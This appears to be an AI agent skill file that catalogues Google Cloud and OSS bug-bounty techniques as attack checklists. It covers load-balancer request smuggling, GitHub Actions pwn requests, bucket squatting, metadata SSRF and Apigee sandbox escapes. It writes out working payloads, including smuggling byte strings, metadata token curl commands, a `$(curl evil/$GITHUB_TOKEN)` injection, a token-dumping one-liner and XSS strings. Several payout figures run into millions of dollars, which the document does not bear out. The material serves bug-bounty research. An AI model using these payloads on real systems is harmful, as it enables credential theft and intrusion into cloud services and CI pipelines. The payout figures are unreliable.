---
name: google-vrp-cloud
description: Google Cloud VRP / OSS VRP techniques for GCP infrastructure. GCP Classic App LB/CDN HTTP parser quirks (bare CR, \xa0 in header names, chunk-ext) for cache poisoning and Cloud Armor bypass; GitHub Actions pwn requests (pull_request_target + fork checkout, auto-label triggers, pom.xml injection, self-hosted runner takeover); GCS bucket squatting (ADC auto-create, motus.appspot.com); GKE Workload Identity Federation downgrade; Zip Slip RCE (SecOps SOAR rasterize.js, Web Designer DLL hijack); GAR yum/dnf plugin URL bypass; Firebase SDK SA key via JSON.stringify; Firebase idToken without email_verified; AMP/Uptime Check SSRF to GCP metadata; Apigee sandbox escapes (Rhino ClassShutter, LookupCache RCE, header injection); Composer/Airflow secret_key + env-var RCE; Cloud Shell root takeover; CEF debugger open. Checklists: GCP LB, GitHub Actions on Google orgs, SA token hunting, Cloud Shell/IDX, Apigee, debug endpoints (/procz /flagz). Source: 202 public HoF reports. Use alongside google-vrp-web and google-vrp-android. Spanish triggers — "gcp", "cloud vrp", "cloud shell", "gke", "apigee", "firebase backend", "bucket squatting", "github actions google", "oss vrp", "cloud run", "cloud armor", "infraestructura google".
---

# Google VRP — Cloud / GCP / Firebase / CI-CD Techniques

Subset of 202-report public Hall-of-Fame. Focus: GCP infrastructure, Cloud VRP, Firebase, Apigee, GitHub Actions / OSS VRP, Cloud Shell/IDX.
Use alongside `google-vrp-web` and `google-vrp-android`.

---

## Recurring patterns (cloud domain)

1. **GCP load balancer / CDN HTTP parser quirks** — bare CR after method, extra spaces after URI, non-ASCII chars in header names (\xa0, \x85), bare CR in chunk-ext BWS. Combine with quirky origin servers (Lighttpd, Tornado, FastHTTP, Node.js, Gunicorn<22) for cache poisoning or Cloud Armor bypass via request smuggling.
2. **GitHub Actions "pwn request"** — `pull_request_target` + fork SHA checkout without `persist-credentials: false` + non-ephemeral self-hosted runners. Auto-label bots trigger label-gated workflows. Inject via pom.xml (Maven exec plugin), `MESSAGE` env interpolation, composite action inputs (`issue-title`, `issue-body`, `main_repo`).
4. **Open Code-OSS / Theia / IDX** — `webWorkerExtensionHostIframe.html` on same origin as IDE. `parentOrigin` from query string + relayed `postMessage` → XSS → RCE. Also: filename injection in `launch.json`, debugger proxy running arbitrary JS, `_workstationAccessToken` Login-CSRF.
6. **GCS bucket squatting** — services auto-creating deterministic buckets (`${project_id}-us-central1-adc`, `motus-pilot.appspot.com`) without ownership check. Pre-claim → cross-tenant RCE via Terraform overwrite.
7. **GKE Workload Identity downgrade** — relabel nodes: `iam.gke.io/gke-metadata-server-enabled=false` + `cloud.google.com/metadata-proxy-ready=true` → recover host SA `cloud-platform` token from metadata. Not exploitable on Autopilot.
8. **Zip Slip → RCE** — no traversal check on zip entry names; overwrite script the server executes (`rasterize.js` for phantomjs in SecOps SOAR; DLL hijack on Web Designer Windows).
9. **GAR yum/dnf plugin URL validation** — `'pkg.dev' in url` matches `attacker.com/mirror?=test-yum.pkg.dev/`. Fix: `urlparse.netloc.endswith('.pkg.dev')`.
11. **Firebase / Firestore SDK SA key leak** — `JSON.stringify` on Firestore objects exposes SA private key in `_settings`. `toJson` vs `toJSON` spelling causes regression (#168).
12. **Firebase config `apiKey` open signup** — `identitytoolkit.googleapis.com/v1/accounts:signUp?key=<apiKey>` → `idToken` (often `email_verified=false`) → bypass management APIs.
13. **Internal Google debug endpoints** — `/labelaclz`, `/flagz`, `/procz?file=`, `/varz`, `/statusz`, `/streamz`, `/reportcardz`, `/java/procz`. LFI as root, leak API keys, SA emails, BNS addresses.
14. **AMP / preview / validator SSRF** — `169.254.169.254/?recursive=true&alt=text` with `Metadata-Flavor: Google`. Use attacker-server redirect chain to bypass IP filters.
24. **GitHub-token leak via `actions/checkout`** — `find $HOME/work -type f -name config | xargs cat` extracts token from local git config. Add `persist-credentials: false`.
25. **Auto-label bots as pwn-request triggers** — `auto-label` on PR title → `pull_request_target: types: [labeled]` fires on attacker code.
27. **JWT / Firebase ID token without `email_verified`** — register `jdoe@google.com`, get `idToken`, hit management API.
28. **Composer / Airflow `secret_key="some-random-id"`** + `PYTHONWARNINGS` / `BROWSER` env vars executed on every Python spawn → reverse shells on all 4 Composer machines.
29. **CEF debugger open** — `--remote-debugging-port` on Electron-style apps (Web Designer, IDX) → local connect for file/SDK access.

---

## Per-report catalog

### #2 — $3,183,700 — Ezequiel Pereira — Cloud DM RCE
Type Provider in Deployment Manager with `descriptorUrl` pointing at internal blade target and `inputMappings.value: $.googleOauth2AccessToken()` — attaches Google OAuth Bearer to outbound requests, response returned in `selfLink`. Use `gslbTarget=blade:apphosting-admin-nightly`, `credentialType:GAIAMINT`, `transport:GSLB`.

### #3 — $3,133,700 — Divyanshu — OSS VRP — magic-modules CI access tokens
Malicious PR against `GoogleCloudPlatform/magic-modules`; CI minted GCP access tokens written to a file accessible from workflow context. Valid across `ci-gke-*`, `ci-bq-*`, `ci-gsuite-sa-project` (contains `gsuite-sa.json`), `graphite-docker-images`.

### #8 — $1,600,000 — Jakub Domeracki — Cloud VRP — SecOps SOAR Zip Slip → RCE
`Compressor.UnzipFilesToFolder()` uses `Path.Combine(directoryName, item2.Entry.Name)` without traversal check. Entry named `/opt/siemplify/siemplify_server/bin/ChartsJs/rasterize.js` overwrites the phantomjs script → RCE → exfiltrate K8s pod env, default SA token, Cloud Secret Manager secrets including `FirebaseRemoteConfigServiceAccountProd` from `siem-firebase-prod`.

### #11 — $1,500,000 — OSS VRP — CDAP/Data Fusion GitHub Actions pwn requests
~22 repos in `data-integrations` / `cdapio` orgs use `workflow_run` triggered by "Trigger build" workflow + `actions/checkout@v3` with `${{ github.event.workflow_run.head_sha }}`. Submit draft PR with workflow named "Trigger build"; parent `build.yml` builds untrusted Maven `pom.xml` (use `maven-exec-plugin` to exfiltrate `GH_TOKEN` from `.git/config`). Non-ephemeral `k8s-runner-build` → runner persistence.

### #13 — $1,333,700 — Jakub Domeracki — Cloud VRP — ADC bucket squatting
Application Design Center auto-creates `${project_id}-us-central1-adc` on first enable without ownership check. Pre-claim + `roles/storage.admin` for `allUsers`. P4SA `service-${project_number}@gcp-sa-designcenter.iam.gserviceaccount.com` writes Terraform files into attacker bucket → leak secrets + overwrite IaC for RCE.

### #14 — $1,333,700 — OSS VRP — Bazel `cherry_picker` action injection
`bazelbuild/continuous-integration/actions/cherry_picker/action.yml` interpolates `${{ inputs.issue-title }}` / `${{ inputs.issue-body }}` directly inside `run:`. Any GitHub user opens issue with title `$(curl evil/$GITHUB_TOKEN)` to inject into composing workflows (bazel/bazel uses this).

### #15 — $1,333,700 — Praetorian — OSS VRP — TensorFlow self-hosted runner takeover
Default GH: workflows from prior contributors skip approval. ARM64 non-ephemeral self-hosted runners. Submit tiny merged PR → become "contributor" → PR workflow `runs-on: [self-hosted, linux, ARM64]` installing a private runner via `nohup ./run.sh &` with `RUNNER_TRACKING_ID=0` to detach. Uses GitHub as C2. Steals `GCP_CREDS`, `AWS_PYPI_ACCOUNT_TOKEN`, `JENKINS_TOKEN`, `DOCKERHUB_TOKEN`.

### #27 — $600,000 — Ben Kallus — GCP Classic App LB request smuggling to Node.js
`POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n2\r\r;a\r\n02\r\n38\r\n0\r\n\r\nGET /bad_path/`. LB allows bare CR inside chunk-ext BWS; Node parses `\r\r` like `\r\n` → smuggled GET `/bad_path/` bypasses Cloud Armor.

### #28 — $500,000 — Jakub Domeracki — Cloud VRP — GKE WIF downgrade attack
`kubectl label nodes $N iam.gke.io/gke-metadata-server-enabled=false --overwrite` + `cloud.google.com/metadata-proxy-ready=true` re-enables Metadata Concealment. `curl http://metadata.google.internal/.../token` with `Metadata-Flavor: Google` returns node SA token (often `cloud-platform`). Not exploitable on Autopilot.

### #30 — $500,000 — Ben Kallus — GCP Classic App LB header-name `\xa0` smuggling
LB forwards non-ASCII bytes in header names; Gunicorn<22 `str.strip` (Unicode-aware) treats `Transfer-Encoding\xa0:` as `Transfer-Encoding:` → bypass Cloud Armor, poison CDN.

### #31 — $500,000 — `xoogler-payday` GCS bucket enumerable
`storage.googleapis.com/xoogler-payday/` listing accessible; password-protected zips downloadable and brute-forceable.

### #32 — $500,000 — Kavindu Pasan — Cloud Cheatsheet XSS
Frontend-only sanitization; POST to Cloud Function `add_architecture` with `link: "javascript://%0aalert(document.domain)"` stores payload running on `googlecloudcheatsheet.withgoogle.com`.

### #33 — $500,000 — Ben Kallus — GCP Classic App LB + CDN cache poisoning via bare CR after method
`GET\r /index.html HTTP/1.1` forwarded; Tornado/Lighttpd/CherryPy treat `GET\r` as distinct method (501) but CDN caches under `/`. Subsequent legitimate `GET /` returns cached 501.

### #34 — $500,000 — Ben Kallus — Cloud CDN bare CR in header values
`Test-Header: X\rX\r\n\r\n` forwarded unchanged; usable for cache poisoning / ACL bypass with origin servers that misinterpret bare CR.

### #37 — $500,000 — Google Public DNS DNSSEC cache pollution
Modifying RRSIG with non-matching key tag returns insecure answer (no AD bit) instead of SERVFAIL → cache pollution of DNSSEC-signed domains.

### #42 — $500,000 — Omar Espino — Google Cloud Shell instance takeover (root)
`<style onload>` XSS in .md preview → LFI `?uri=file://` → container escape `../id_cloudshell` → SSH root to `devshell-vm-XXXX.cloudshell.dev:6000`. Delivered via GitHub "Open in Cloud Shell" button.

### #43 — $500,000 — wtm (offensi) — Cloud Shell `go_get_repo` RCE
Undocumented `?go_get_repo=go.offensi.com/go.html` invokes `go get`; serve `<meta name="go-import" content="… hg https://attacker/hgrepo/root">` to load Mercurial repo exploiting CVE-2019-3902 → drop malicious `cut` binary executed by `cloudshell_open`.

### #48 — $500,000 — GCR delete via GKE node with read-only `devstorage` scope
`gcloud container images delete` from GKE pod with `devstorage.read_only` succeeds via `projectEditor` legacy bucket binding that overrides the node scope.

### #57 — $313,370 — NDevTK — IDX insecure debugger proxy
`https://8282-monospace-<ID>.cloudworkstations.dev/proxy?url=` runs arbitrary JS; registers service worker capturing `_workstation/login?redirect=<secret>` URL → mint `WorkstationJwt` cookie for any port subdomain.

### #61 — $313,370 — Mohamed Mahmoudi — GCP Backend Bucket misrouting
LB concatenates path-before-`/` with bucket name: `GET -pwn/index.html` to LB with bucket `vellum-sc-backend-bucket-for-protection` → GCS request `GET vellum-…-protection-pwn/index.html`. Pre-claim `<bucket>-pwn` for response forgery. 5000+ LBs vulnerable.

### #73 — $313,370 — Jinseo Kim — Kaggle Kernel metadata SSRF
`curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token` from any Kaggle kernel returns broad-scope token.

### #74 — $313,370 — Jafar Abu Nada — `peering.google.com` LFI
`/static/images/couch-ipad.png../../../../../../../etc/passwd` reads files; leaks `apihost_address=169.254.169.253:4`.

### #77 — $233,700 — Jinseo Kim — Caja playground SSRF
`https://caja.appspot.com/#http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token` returns `cloud-platform` scoped access token.

### #80 — $150,000 — Basavaraj Banakar — AppSheet Apigee SSRF
`OpenAPI Spec URL` fetched server-side; `http://169.254.169.254` returns metadata folder index.

### #82 — $133,700 — Ben Kallus — GCP LB extra-spaces cache poisoning
`GET /      HTTP/1.1` forwarded; CDN caches under `/`, Lighttpd<1.4.77/FastHTTP return 404 → cached 404 poisons `/`.

### #83 — $133,700 — Jakub Domeracki — Firebase idToken without `email_verified`
`identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSy…` registers `jdoe@google.com` with `email_verified=false`; JWT accepted by `partner-companion.cloud.google/api/feedback-list` and other admin endpoints.

### #84 — $133,700 — `knowyourdata-tfds.withgoogle.com` LFI
`/assets/onboarding//..%2f..%2f..%2f..%2f..%2f..%2f__init__.py` reads source.

### #85 — $133,700 — Apigee Rhino ClassShutter sandbox bypass
JavaCallout instantiates object with `run()` payload in a flow variable; JavaScript policy retrieves and calls `run()` — different policy security models share state.

### #86 — $133,700 — Apigee header injection via positional set
`context.setVariable("request.header.customHeader.1", "value\r\nInjectedHeader: x")` — newline filter only applies to name-based setting, not positional index.

### #87 — $133,700 — Apigee LookupCache `postDeserialize()` RCE
Cache entry implementing `com.apigee.util.PostDeserializer` runs `postDeserialize()` outside Java Permissions. Populate via PopulateCache → retrieve via LookupCache → arbitrary Java RCE.

### #97 — $50,000 — Open Chronograf InfluxDB on `216.73.89.76:8083`
Admin panel accessible without login at `/sources/1/status`.

### #98 — $50,000 — OSS-Fuzz `pr_helper.yml` JS injection
PR creates `projects/new-project/whatever/project.yaml` with `main_repo` containing `require('child_process').execSync(atob('...'))`. Python writes it to `MESSAGE` env var; JS step interpolates → RCE. `pull-requests: write` token forges `Ready to merge` label.

### #99 — $50,000 — Firestore Node SDK SA key via JSON.stringify
All Firestore objects reference `_settings` containing the SA private key; default `JSON.stringify` exposes it. See #168 for `toJson`/`toJSON` regression.

### #102 — $50,000 — Cloud Tools for Eclipse OAuth chain
`redirect_uri=http://localhost:8080/_ah/login?continue=http://attacker.com` — App Engine local server `_ah/login` is an open redirect; OAuth code leaks via Referer.

### #103 — $50,000 — Cloud Tools for Eclipse XXE
Opens `appengine-web.xml` with default XML parser; external DTD `<!ENTITY % file "file:///etc/passwd">` exfiltrates files.

### #104 — $50,000 — HPC Toolkit nginx alias traversal
`location /static { alias …/static/; }` (no trailing `/` on location); `/static../website/settings.py` reads source.

### #109 — $50,000 — Firebase Dynamic Links cross-tenant
APK's `google_crash_reporting_api_key` + `X-Android-Package` + `X-Android-Cert` → `firebasedynamiclinks.googleapis.com/v1/shortLinks` → mint links under any `*.page.link` of other apps.

### #110 — $50,000 — AppSheet Apigee SSRF redirect bypass
Blocked-localhost filter bypassed via attacker `302.php?url=http://localhost:20202` (Fluent Bit prometheus exporter exposed).

### #115 — $50,000 — `motus.area120.com` Firebase Storage list
Any signed-in user lists `firebasestorage.googleapis.com/v0/b/motus-pilot.appspot.com/o/` → downloads Firestore/Datastore exports with user data and Stripe IDs.

### #123 — $20,000 — `partner-companion.cloud.google` Stored XSS
Unauth POST `/api/notifications`; `link` field → `window.open()`. Use `javascript://%0aeval(atob('…'))` to exfiltrate `gpau_id` Firebase OIDC token from `localStorage`.

### #126 — $10,100 — `gmail-oauth2-tools/oauth2.py` SSL not validated
`imaplib.IMAP4_SSL` / `smtplib.starttls()` without explicit SSL context skips cert verification → MITM captures XOAUTH2 tokens.

### #127 — $10,100 — Cloud Tools for Eclipse Login CSRF
Missing `state` param; local HTTP callback accepts attacker `code` → IDE deploys to attacker GCP project.

### #129 — $10,000 — `alloydb-java-connector` CI GITHUB_TOKEN leak
`pull_request_target` + auto-label on PR title; `actions/checkout` without `persist-credentials: false`; PR-supplied `.kokoro/build.sh` exfiltrates token.

### #135 — $10,000 — Google Drive macOS installer LPE
Postinstall `chmod u+s` without symlink check; race-replace binary with symlink to `/opt/local/bin/fish` → setuid root shell.

## $0 reports (summary)
- **#149** Firebase Storage takeover — public `apiKey` → `accounts:signUp` → overwrite `io-photobooth-20667.appspot.com`.
- **#150** kernelCTF: net/xfrm UAF (Linux ≤6.16.9) via SPI=0 `xfrm_state_update` lookup after free.
- **#151** YouTube Studio Closure `goog.loadModuleFromSource_` RCE — `COMPILED=false` on prod, exfiltrates SID/SAPISID.
- **#152** Guava `maven-bundle-plugin` 5.1.8 (CVE-2021-42036) in pom.xml — supply chain.
- **#153** Civetweb DoS: SSI infinite inclusion + heap BOF in 301-redirect path.
- **#155** LangGraph quickstart path traversal `app/{path:path}` → `/etc/shadow`, `.env`.
- **#156** `pages.mandiant.com/version` exposes service versions + commit hashes.
- **#157** GAR yum/dnf plugin: `'pkg.dev' in url` matches attacker domain → receives SA Bearer token.
- **#162** IDX shared-workspace session persists after access removal.
- **#164** Google leaking 60+ IXP LAN segments to GCP customers via BGP.
- **#165** GCP Composer env-var RCE: `PYTHONWARNINGS` + `BROWSER` → reverse shell on all 4 Composer machines.
- **#168** Firestore SDK `toJson` vs `toJSON` regression closing #99.
- **#169** Drive macOS TCC bypass via child injection: `--debugger_command iTerm2` inherits Drive's photos entitlement.

---

## Checklists

### GCP Classic App LB:
- bare CR after method (`GET\r /`) — cache poisoning to Lighttpd/Tornado/CherryPy/libsoup/libevent.
- bare CR in chunk-ext BWS (`2\r\r;a\r\n`) — request smuggling to Node.js.
- non-ASCII bytes in header names (`\xa0`, `\x85`) — smuggling to Gunicorn<22.
- multiple SP after URI (`GET /     HTTP/1.1`) — cache poisoning to Lighttpd<1.4.77 / FastHTTP.
- bare CR in arbitrary header values forwarded to backend.

### GitHub Actions on Google orgs:
- `pull_request_target` without label gating, or label gating via `auto-label` bot on PR title/body.
- `workflow_run` triggered by attacker-named workflow.
- `actions/checkout` without `persist-credentials: false`.
- `${{ github.event.X.title|body|main_repo }}` interpolated inside `run:` or `env:`.
- composite actions interpolating user inputs (`issue-title`, `issue-body`).
- non-ephemeral self-hosted runners (cleanup steps, persistent home dir).
- Maven `pom.xml` with `exec-maven-plugin` reachable from PR-supplied build.
- `id-token: write`, `pull-requests: write`, `issues: write` as dangerous repo-default permissions.

### GCP services with SA tokens:
- creds in `.git/config`, env vars, or instance metadata (IDE/Cloud-Shell-style products).
- yum/dnf/apt plugins with weak URL validation (`'pkg.dev' in url`).
- `container.nodes.update` permission on GKE clusters (WIF downgrade).
- Composer/Airflow envs accepting user-set `BROWSER`, `PYTHONWARNINGS`.
- deterministic buckets (`${project}-{region}-{service}`) auto-created without ownership check.

### Cloud Shell / IDX / Cloud Workstations:
- preview/extension-host iframes on same origin as IDE.
- `parentOrigin` from query string accepted as postMessage trust.
- filename injection in launch.json or debugger UI.
- debugger proxies that fetch arbitrary URLs.
- Login-CSRF via `_workstationAccessToken` GET param.

### Internal Google IPs (ASN 15169):
- `/labelaclz`, `/flagz`, `/procz?file=`, `/varz`, `/statusz`, `/streamz`, `/reportcardz`, `/java/*` variants.
- `Default LabelACL Policy: OPEN`, `mdb/<group>` ACLs.
- BNS addresses, `gws-prod`, SA emails in environ.

### Apigee:
- JavaCallout → JavaScript inter-policy state for ClassShutter escape.
- LookupCache `postDeserialize()` Java RCE.
- Hosted Targets Node.js running as root.
- Positional header set `request.header.foo.1` bypasses newline filter.
